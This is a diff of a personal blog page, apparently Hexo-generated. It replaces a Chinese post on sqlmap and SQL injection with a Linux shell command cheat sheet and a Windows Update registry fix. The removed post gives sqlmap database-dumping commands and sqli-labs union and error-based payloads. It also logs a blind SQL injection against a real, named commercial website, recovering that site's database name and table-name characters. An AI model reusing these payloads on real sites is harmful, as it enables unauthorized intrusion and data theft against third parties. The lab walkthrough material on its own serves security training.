@@ -16,27 +16,25 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
-  <title>Sqlmap - MiKey</title>
+  <title>Linux shell - MiKey</title>
   
-    <meta name="description" content="在当今互联网飞速发展的时代，网络安全显得尤为重要。随着Web应用的普及，SQL注入攻击（SQL Injection）成为了一种常见且危害巨大的攻击手段。SQL注入攻击不仅能够窥探数据库中的敏感信息，甚至还能篡改数据、破坏数据库结构，给企业和用户带来巨大的损失。 为了应对这种威胁，安全研究人员和开发者们开发了各种工具和技术来检测和防御SQL注入攻击。SQLMap就是其中一款广受欢迎和高度评价的自动化">
+    <meta name="description" content="https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_38883338&#x2F;article&#x2F;details&#x2F;82079524?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522f6b9a22b309034be0363b02dffbeb9b4%2522%252C%2522scm%2522%253A%252220140713.1301023">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Sqlmap">
-<meta property="og:url" content="http://mikeytki.github.io/posts/922590b9/index.html">
+<meta property="og:title" content="Linux shell">
+<meta property="og:url" content="http://mikeytki.github.io/posts/b1ad0e26/index.html">
 <meta property="og:site_name" content="MiKey">
-<meta property="og:description" content="在当今互联网飞速发展的时代，网络安全显得尤为重要。随着Web应用的普及，SQL注入攻击（SQL Injection）成为了一种常见且危害巨大的攻击手段。SQL注入攻击不仅能够窥探数据库中的敏感信息，甚至还能篡改数据、破坏数据库结构，给企业和用户带来巨大的损失。 为了应对这种威胁，安全研究人员和开发者们开发了各种工具和技术来检测和防御SQL注入攻击。SQLMap就是其中一款广受欢迎和高度评价的自动化">
+<meta property="og:description" content="https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_38883338&#x2F;article&#x2F;details&#x2F;82079524?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522f6b9a22b309034be0363b02dffbeb9b4%2522%252C%2522scm%2522%253A%252220140713.1301023">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://p.ipic.vip/fy0q9p.png">
-<meta property="og:image" content="https://p.ipic.vip/9qlw5a.png">
-<meta property="og:image" content="https://p.ipic.vip/8ulhg4.png">
-<meta property="og:image" content="https://p.ipic.vip/bo3niv.png">
-<meta property="article:published_time" content="2023-05-27T06:17:06.000Z">
-<meta property="article:modified_time" content="2024-06-04T12:05:45.491Z">
+<meta property="article:published_time" content="2024-12-12T07:19:14.000Z">
+<meta property="article:modified_time" content="2025-04-19T07:31:46.774Z">
 <meta property="article:author" content="Mikey">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="shell">
+<meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://p.ipic.vip/fy0q9p.png">
   
   
-  
+  <meta name="keywords" content="Linux,shell,笔记">
   <!-- feed -->
   
     <link rel="alternate" href="/atom.xml" title="MiKey" type="application/atom+xml">
@@ -85,118 +83,202 @@
 
 
 
-<div class="article banner top">
+<div class="article banner top"><img class="bg" src="https://gcore.jsdelivr.net/gh/mikeytki/CDN/img/jx.jpeg">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/web/">web</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-05-27T06:17:06.000Z">2023-05-27</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-06-04T12:05:45.491Z">2024-06-04</time></span></div></div></div>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a></div><div id="tag"> <span>&nbsp标签：</span><a class="cap breadcrumb-link" href="/tags/Linux/">Linux</a>&nbsp; <a class="cap breadcrumb-link" href="/tags/shell/">shell</a>&nbsp; <a class="cap breadcrumb-link" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a>&nbsp</div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-12-12T07:19:14.000Z">2024-12-12</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-04-19T07:31:46.774Z">2025-04-19</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>Sqlmap</span></h1>
+        <h1 class="text title"><span>Linux shell</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><p>在当今互联网飞速发展的时代，网络安全显得尤为重要。随着Web应用的普及，SQL注入攻击（SQL Injection）成为了一种常见且危害巨大的攻击手段。SQL注入攻击不仅能够窥探数据库中的敏感信息，甚至还能篡改数据、破坏数据库结构，给企业和用户带来巨大的损失。</p>
-<p>为了应对这种威胁，安全研究人员和开发者们开发了各种工具和技术来检测和防御SQL注入攻击。SQLMap就是其中一款广受欢迎和高度评价的自动化SQL注入与数据库接管工具。它不仅功能强大，易于使用，而且支持多种数据库类型和注入技术，使得它成为渗透测试人员和安全爱好者的必备工具之一。</p>
-<p>本篇博客将带领大家深入了解SQLMap，从其基本原理、安装和配置，到实际使用中的常见场景和技巧。无论你是初学者还是有一定经验的安全从业者，相信都能从中获得有益的信息和灵感。让我们一起揭开SQLMap的神秘面纱，探索其在网络安全领域的强大能力。</p>
-<span id="more"></span>
-<h2 id="sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html" target="_blank" title="sqlmap" style="color: red;">sqlmap超详细笔记</a><br>一款自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。</p>
-<p>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>4、联合查询注入，可以使用union的情况下的注入。<br>5、堆查询注入，可以同时执行多条语句的执行时的注入。</p>
-<h3 id="i-判断是否存在注入"><a href="#I-判断是否存在注入" class="headerlink" title="I. 判断是否存在注入"></a>I. 判断是否存在注入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u url </span><br></pre></td></tr></table></figure>
-<p><img src="https://p.ipic.vip/fy0q9p.png" alt="code"></p>
-<h3 id="ii判断文本中的请求是否存在注入"><a href="#II-判断文本中的请求是否存在注入" class="headerlink" title="II.判断文本中的请求是否存在注入"></a>II.判断文本中的请求是否存在注入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -r desktop/<span class="number">1.</span>txt </span><br></pre></td></tr></table></figure>
-
-<h3 id="iii查询当前用户下的所有数据库"><a href="#III-查询当前用户下的所有数据库" class="headerlink" title="III.查询当前用户下的所有数据库"></a>III.查询当前用户下的所有数据库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u url --dbs</span><br></pre></td></tr></table></figure>
-
-<p>确定网站存在注入后，用于查询当前用户下的所有数据库。如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有相关数据库。</p>
-<p><img src="https://p.ipic.vip/9qlw5a.png" alt="code"></p>
-<h3 id="iv获取数据库中的表名"><a href="#IV-获取数据库中的表名" class="headerlink" title="IV.获取数据库中的表名"></a>IV.获取数据库中的表名</h3><p>选取一个数据库，获取此库的表名</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u url -D 数据库名 --tables</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://p.ipic.vip/8ulhg4.png" alt="code"></p>
-<h3 id="v获取表中的字段名"><a href="#V-获取表中的字段名" class="headerlink" title="V.获取表中的字段名"></a>V.获取表中的字段名</h3><p>4张表选取一个,获取其中字段名</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u url -D 库名 -T 该库中的表名 –columns</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://p.ipic.vip/bo3niv.png" alt="code"></p>
-<h2 id="buuctf-sqli-labs"><a href="#BUUCTF-sqli-labs" class="headerlink" title="BUUCTF sqli-labs"></a>BUUCTF sqli-labs</h2><p><font color="LightSlateGray">第一关</font>&gt;</p>
-<p>?id&#x3D;-1’ order by 4–+<br>字段数 3</p>
-<p>?id&#x3D;-1’ union select 1,2,3–+<br>2，3回显</p>
-<p>?id&#x3D;-1’ union select 1,database(),3–+<br>database &#x3D; security</p>
-<p><font color="LightSlateGray">第二关</font><br>?id&#x3D;1’ order by 1–+<br>报错  order by 1– LIMIT 0,1<br>数字型</p>
-<p>?id&#x3D;1 order by 3–+<br>字段数 ：3</p>
-<p>?id&#x3D;-1 union select 1,2,3–+<br>2，3回显</p>
-<p>?id&#x3D;-1 union select 1,database(),3–+<br>database &#x3D; security</p>
-<p><font color="LightSlateGray">第三关</font><br>?id&#x3D;1’ order by 5–+<br>报错 ：order by 5– ‘) LIMIT 0,1</p>
-<p>?id&#x3D;1’) order by 5–+<br>字段数 ：3</p>
-<p>?id&#x3D;-1’) union select 1,2,3–+<br>2，3回显</p>
-<p>?id&#x3D;-1’) union select 1,database(),3–+<br>database &#x3D; security</p>
-<p><font color="LightSlateGray">第四关</font><br>先试一下 ：?id&#x3D;1’<br>正常显示<br>在试一下 ：?id&#x3D;1”<br>报错 ：”1””) LIMIT 0,1</p>
-<p>?id&#x3D;1”) order by 4–+<br>字段数 ：3</p>
-<p>?id&#x3D;-1”)  union select 1,2,3–+<br>2，3回显</p>
-<p>?id&#x3D;-1”)  union select 1,database(),3–+<br>database &#x3D; security</p>
-<p><font color="LightSlateGray">第五关</font></p>
-<p><code>?id=1&#39; order by 4--+</code><br><code>字段数 ：3</code></p>
-<p><code>?id=1 and &#39;1&#39;=&#39;1&#39;</code><br><code>&#39;  1&#39;=&#39;1&#39;&#39; LIMIT 0,1  &#39;</code></p>
-<p><code>?id=1 and &#39;1&#39;=&#39;1</code><br><code>&#39;  1&#39;=&#39;1&#39; LIMIT 0,1  &#39;</code></p>
-<p><code>&#39;  &#39;1&#39;&#39; LIMIT 0,1 &#39;</code></p>
-<p><code>?id=-1&#39; union select 1,2,3--+</code><br><code>无显示位</code></p>
-<p><code>使用报错注入</code><br><code>1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code><br><code>database = security</code></p>
-<p><font color="LightSlateGray">第六关</font></p>
-<p><code>?id=1’ --+</code><br><code>报错</code></p>
-<p><code>?id=1&quot; --+</code><br><code>显示</code></p>
-<p><code>?id=1&quot; order by 4--+</code><br><code>字段数 ：3</code></p>
-<p><code>?id=-1&quot; union select 1,2,3--+</code><br><code>无显示位</code></p>
-<p><code>?id=1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code><br><code>?id=1&quot; select count(*),concat((database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x</code><br><code>database = security</code></p>
-<p><font color="LightSlateGray">第七关</font><br>1” 1&#x3D;1<br>1&amp;quot;1&#x3D;1</p>
-<p>1’ count(*),concat((database()),0x7e,flooorr(raandnd(0)*2))x from infmation_schema.tables ggroup byroup by x</p>
-<h3 id="示例网站"><a href="#示例网站" class="headerlink" title="示例网站"></a>示例网站</h3><p><a target="_blank" rel="noopener" href="http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1/1">http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1/1</a><br>正常显示</p>
-<p><a target="_blank" rel="noopener" href="http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1">http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1</a> and (length(database()))&gt;16<br>database长度: 16</p>
-<p><a target="_blank" rel="noopener" href="http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1">http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1</a> and ascii(substr(database(),2,1))&gt;101<br>database前两位：te<br>第一位</p>
-<blockquote>
-<p>115 13862<br>116 12386 116<br>第二位<br>100 13862<br>101 12398 101</p>
-</blockquote>
-<blockquote>
-<p>1      2     3    4     5     6    7     8     9     10   11 12   13 14   15 16<br>116 101 99 104 109 97 114 116 104 107 95 100 97 116 97 50<br>t      e     c    h     m    a    r      t      h     k      _   d     a    t     a    2<br>database &#x3D; techmarthk_data2</p>
-</blockquote>
-<p>and (ascii(substr((select table_name from information_schema.tables where  table_schema&#x3D;database() limit   0, 1 ), 1,1) )  ) &gt; 100<br>109<br>m</p>
-<blockquote>
-<p>s      z      t      e      s       t    c     n<br>115 122 116 101 115 116 99 110</p>
-</blockquote>
-<p>ID&#x3D;1+%75%6e%69%6f%6e+%73%65%6c%65%63%74+1,2,3,4,5,6,7,8,10–+</p>
+  </div><article class="md-text content"><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38883338/article/details/82079524?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522f6b9a22b309034be0363b02dffbeb9b4%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=f6b9a22b309034be0363b02dffbeb9b4&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-82079524-null-null.142%5Ev102%5Epc_search_result_base4&utm_term=ubuntu22.04%E8%A7%A3%E5%8E%8Bzip&spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_38883338/article/details/82079524?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522f6b9a22b309034be0363b02dffbeb9b4%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=f6b9a22b309034be0363b02dffbeb9b4&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-82079524-null-null.142^v102^pc_search_result_base4&amp;utm_term=ubuntu22.04%E8%A7%A3%E5%8E%8Bzip&amp;spm=1018.2226.3001.4187</a></p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h5 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h5><ul>
+<li>将文件解压到特定目录，可以使用-C选项。例如，将文件解压到&#x2F;path&#x2F;to&#x2F;directory&#x2F;目录<ul>
+<li><code>tar -xzvf XXX.tar.gz -C /path/to/directory/</code></li>
+<li><code>unzip XXX.zip</code>  # 解压zip文件</li>
+</ul>
+</li>
+</ul>
+<h5 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h5><ul>
+<li><p>复制 目录cl 到 目录home（～）下</p>
+<ul>
+<li><code>cp -r cl home  （-r选项用于递归复制，复制整个目录树）</code></li>
+</ul>
+</li>
+<li><p>将 文件 a.txt 移动到 目录home下</p>
+<ul>
+<li><code>mv a.txt home</code></li>
+</ul>
+</li>
+<li><p>将 目录cl 移动到 目录home下</p>
+<ul>
+<li><code>mv cl home</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h5><ul>
+<li><p>将 a.txt 重命名为 b.txt</p>
+<ul>
+<li><code>mv a.txt b.txt</code></li>
+</ul>
+</li>
+<li><p>将 目录cl 重命名为 目录cl2</p>
+<ul>
+<li><code>mv cl cl2</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="查看文件和目录"><a href="#查看文件和目录" class="headerlink" title="查看文件和目录"></a>查看文件和目录</h5><ul>
+<li><p>列出当前目录下的所有文件和目录</p>
+<ul>
+<li><code>ls -l</code>  # 以详细格式列出</li>
+<li><code>ls -a</code>  # 列出所有文件，包括隐藏文件</li>
+</ul>
+</li>
+<li><p>查看文件内容</p>
+<ul>
+<li><code>cat filename</code>  # 显示文件内容</li>
+<li><code>less filename</code>  # 分页查看文件内容</li>
+<li><code>head filename</code>  # 查看文件的前10行</li>
+<li><code>tail filename</code>  # 查看文件的后10行</li>
+</ul>
+</li>
+</ul>
+<h5 id="文件和目录操作"><a href="#文件和目录操作" class="headerlink" title="文件和目录操作"></a>文件和目录操作</h5><ul>
+<li><p>创建目录</p>
+<ul>
+<li><code>mkdir new_directory</code>  # 创建新目录</li>
+</ul>
+</li>
+<li><p>删除文件和目录</p>
+<ul>
+<li><code>rm filename</code>  # 删除文件</li>
+<li><code>rm -r directory</code>  # 递归删除目录及其内容</li>
+</ul>
+</li>
+<li><p>复制文件和目录</p>
+<ul>
+<li><code>cp filename destination</code>  # 复制文件</li>
+<li><code>cp -r directory destination</code>  # 递归复制目录</li>
+</ul>
+</li>
+</ul>
+<h5 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h5><ul>
+<li><p>修改文件权限</p>
+<ul>
+<li><code>chmod 755 filename</code>  # 修改文件权限</li>
+<li><code>chmod -R 755 directory</code>  # 递归修改目录权限</li>
+</ul>
+</li>
+<li><p>修改文件所有者</p>
+<ul>
+<li><code>chown user:group filename</code>  # 修改文件的所有者和组</li>
+</ul>
+</li>
+</ul>
+<h5 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h5><ul>
+<li><p>查看当前用户&#96;</p>
+<ul>
+<li><code>whoami</code>  # 显示当前用户</li>
+</ul>
+</li>
+<li><p>查看系统信息</p>
+<ul>
+<li><code>uname -a</code>  # 显示系统信息</li>
+<li><code>top</code>  # 实时查看系统进程</li>
+</ul>
+</li>
+<li><p>查看磁盘使用情况</p>
+<ul>
+<li><code>df -h</code>  # 显示磁盘使用情况</li>
+<li><code>du -sh directory</code>  # 显示目录的大小</li>
+</ul>
+</li>
+<li><p>下载文件</p>
+<ul>
+<li><code>wget url</code>  # 从指定URL下载文件</li>
+</ul>
+</li>
+</ul>
+<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ul>
+<li><p>查找文件</p>
+<ul>
+<li><code>find /path -name filename</code>  # 在指定路径查找文件</li>
+<li><code>locate filename</code>  # 快速查找文件（需要更新数据库）</li>
+</ul>
+</li>
+<li><p>搜索文本</p>
+<ul>
+<li><code>grep &#39;text&#39; filename</code>  # 在文件中搜索指定文本</li>
+</ul>
+</li>
+<li><p>处理文本文件</p>
+<ul>
+<li><code>cut -d&#39;:&#39; -f1 filename</code>  # 按分隔符切割文件并提取特定字段</li>
+<li><code>sort filename</code>  # 对文件内容进行排序</li>
+<li><code>uniq filename</code>  # 去除文件中的重复行</li>
+<li><code>wc -l filename</code>  # 统计文件的行数</li>
+</ul>
+</li>
+</ul>
+<h5 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h5><ul>
+<li><p>查看当前进程</p>
+<ul>
+<li><code>ps aux</code>  # 显示所有进程</li>
+<li><code>top</code>  # 实时查看系统进程</li>
+<li><code>htop</code>  # 更友好的进程管理工具（需要安装）</li>
+</ul>
+</li>
+<li><p>杀死进程</p>
+<ul>
+<li><code>kill PID</code>  # 根据进程ID杀死进程</li>
+<li><code>killall process_name</code>  # 根据进程名称杀死所有相关进程</li>
+<li><code>kill -9 name</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="vmware-安装失败解决"><a href="#VMware-安装失败解决" class="headerlink" title="VMware 安装失败解决"></a>VMware 安装失败解决</h3><h4 id="解决-windows-update"><a href="#解决-Windows-update" class="headerlink" title="解决 Windows update"></a>解决 Windows update</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/SoulOfmate/article/details/137375031">https://blog.csdn.net/SoulOfmate/article/details/137375031</a></li>
+<li>Windows update无法启动，拒绝访问<br>解决办法<br>修改注册表中<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv</code>的权限<br><a target="_blank" rel="noopener" href="https://i-blog.csdnimg.cn/blog_migrate/5cb1214aa1acf0dfc5d872595f040aa3.png#pic_center">https://i-blog.csdnimg.cn/blog_migrate/5cb1214aa1acf0dfc5d872595f040aa3.png#pic_center</a><br>高级-&gt;修改所有者为Administrator-&gt;修改Administrator的权限（完全控制）</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.sordum.org/9470/windows-update-blocker-v1-8/">https://www.sordum.org/9470/windows-update-blocker-v1-8/</a></p>
 
 <div class="article-footer fs14">
     <section id="license">
       <div class="header"><span>许可协议</span></div>
-      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。<center>主域名：<br><a target="_blank" rel="noopener" href="https://mikeytk.cn"><b><font color="#a591e0">mikeytk.cn</font></b></a><br>📬：<b><font color="#a591e0"><a href="mailto:&#x37;&#x30;&#x34;&#x35;&#x39;&#54;&#49;&#52;&#x31;&#64;&#113;&#113;&#46;&#x63;&#111;&#109;">&#x37;&#x30;&#x34;&#x35;&#x39;&#54;&#49;&#52;&#x31;&#64;&#113;&#113;&#46;&#x63;&#111;&#109;</a></font></b></a></center></p>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。<center>主域名：<br><a target="_blank" rel="noopener" href="https://mikeytk.cn"><b><font color="#a591e0">mikeytk.cn</font></b></a><br>📬：<b><font color="#a591e0"><a href="mailto:&#x37;&#48;&#52;&#53;&#57;&#54;&#49;&#52;&#x31;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x37;&#48;&#52;&#53;&#57;&#54;&#49;&#52;&#x31;&#64;&#x71;&#x71;&#46;&#x63;&#x6f;&#x6d;</a></font></b></a></center></p>
 </div>
     </section>
     
     <section id="share">
       <div class="header"><span>分享文章</span></div>
       <div class="body">
-        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="http://mikeytki.github.io/posts/922590b9/" /></div>
-        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=http://mikeytki.github.io/posts/922590b9/&title=Sqlmap - MiKey&summary=在当今互联网飞速发展的时代，网络安全显得尤为重要。随着Web应用的普及，SQL注入攻击（SQL Injection）成为了一种常见且危害巨大的攻击手段。SQL注入攻击不仅能够窥探数据库中的敏感信息，甚至还能篡改数据、破坏数据库结构，给..."><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=Sqlmap - MiKey&amp;body=http://mikeytki.github.io/posts/922590b9/"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="http://mikeytki.github.io/posts/b1ad0e26/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=http://mikeytki.github.io/posts/b1ad0e26/&title=Linux shell - MiKey&summary=https://blog.csdn.net/weixin_38883338/article/details/82079524?ops_request_misc=%257B%2522request%255Fid%2522%253A%25..."><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=Linux shell - MiKey&amp;body=http://mikeytki.github.io/posts/b1ad0e26/"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img  src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
         
         <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
-          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=http://mikeytki.github.io/posts/922590b9/"/>
+          <img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=http://mikeytki.github.io/posts/b1ad0e26/"/>
         </div>
         
       </div>
     </section>
     </div>
 </article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/b132932/">Hexo</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/4a17b156/">Interview</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/e115566c/">网络工程基础</a></div></section></div>
 
 <div class="related-wrap" id="related-posts">
     <section class='header'>
       <div class='title cap theme'>您可能感兴趣的文章</div>
     </section>
     <section class='body'>
-    <div class="related-posts"><a class="item" href="/posts/74d3b872/" title="SQL注入漏洞测试(HTTP头注入)"><span class="title">SQL注入漏洞测试(HTTP头注入)</span><span class="excerpt">SQL注入HTTP头部注入是一种攻击技术，攻击者通过在HTTP请求头部（如User-Agent、Referer、Cookie等）中注入恶意的SQL代码，试图操纵目标服务器的数据库查询。由于服务器端可能在处理这些头部信息时直接将其插入到...</span></a></div></section></div>
+    <div class="related-posts"><a class="item" href="/posts/e115566c/" title="网络工程基础"><span class="title">网络工程基础</span><span class="excerpt">网络工程师负责设计、部署和维护计算机网络系统，包括交换机、路由器配置，TCP&#x2F;IP、DNS等协议的掌握，以及网络安全。他们需具备良好沟通和问题解决能力，理解网络拓扑、负载均衡、高可用性及云计算等领域知识。</span></a></div></section></div>
 
 
 
@@ -349,7 +431,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap"><span class="toc-text">Sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#i-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="toc-text">I. 判断是否存在注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ii%E5%88%A4%E6%96%AD%E6%96%87%E6%9C%AC%E4%B8%AD%E7%9A%84%E8%AF%B7%E6%B1%82%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="toc-text">II.判断文本中的请求是否存在注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iii%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">III.查询当前用户下的所有数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iv%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-text">IV.获取数据库中的表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-text">V.获取表中的字段名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buuctf-sqli-labs"><span class="toc-text">BUUCTF sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E7%BD%91%E7%AB%99"><span class="toc-text">示例网站</span></a></li></ol></li></ol></div><div class="widget-footer">
